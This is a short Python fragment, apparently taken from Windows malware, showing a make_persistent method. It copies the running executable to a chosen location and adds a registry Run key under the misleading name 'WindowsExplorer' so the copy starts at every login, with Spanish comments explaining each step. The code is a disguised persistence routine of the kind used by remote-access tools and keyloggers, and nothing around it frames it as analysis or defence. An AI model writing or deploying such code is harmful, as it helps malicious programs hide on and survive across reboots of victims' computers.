...
class Windows:
    ...
    def make_persistent(self):
        ...
        if not os.path.exists(location):
            # Copiar el archivo al directorio de inicio
            subprocess.call(f'copy {sys.executable} {location}', shell=True)
            # Añadir al registro para que se ejecute al inicio
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsExplorer /t REG_SZ /d "{location}"', shell=True)
